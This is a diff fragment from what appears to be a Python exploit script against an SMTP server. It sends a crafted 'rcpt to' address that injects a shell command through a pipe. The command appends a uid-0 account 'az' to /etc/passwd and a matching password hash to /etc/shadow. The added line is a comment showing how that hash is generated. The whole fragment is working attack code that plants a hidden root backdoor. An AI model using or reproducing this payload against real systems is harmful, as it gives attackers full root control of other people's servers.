@@ -17,6 +17,7 @@ print banner
 s.send('mail from: az@az.lan\r\n')
 result=s.recv(1024)
 print result
+# $ echo "password" |openssl passwd -1 -stdin
 s.send('rcpt to: root+:"|echo \'az:x:0:0::/root:/bin/bash\' >> /etc/passwd && echo \'az:$1$qn9q54Bd$5Io7epAfYclG1VwgquNqe0:16514:0:99999:7:::\' >> /etc/shadow"\r\n')
 result=s.recv(1024)
 print result
